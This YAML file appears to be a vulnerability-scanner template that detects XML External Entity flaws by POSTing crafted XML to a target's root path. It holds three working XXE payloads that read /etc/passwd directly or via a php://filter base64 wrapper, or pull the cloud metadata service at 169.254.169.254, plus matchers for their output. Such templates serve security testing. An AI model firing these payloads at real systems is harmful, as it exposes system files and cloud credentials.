id: http-xxe-detection
info:
  name: "XML External Entity (XXE) Detection"
  severity: "High"
  description: "Detects XXE vulnerabilities by injecting XML payloads with external entity declarations."
  compliance:
    owasp: "A05:2021"
    cwe: "CWE-611"
requests:
  - method: POST
    path: "/"
    attack: inject
    inject_in: body
    payloads:
      - '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
      - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'
      - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>'
    body: "INJECT_HERE"
    headers:
      Content-Type: "application/xml"
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "ami-id"
          - "cm9vdA=="
      - type: status
        part: status
        status:
          - 200
    matcher_condition: and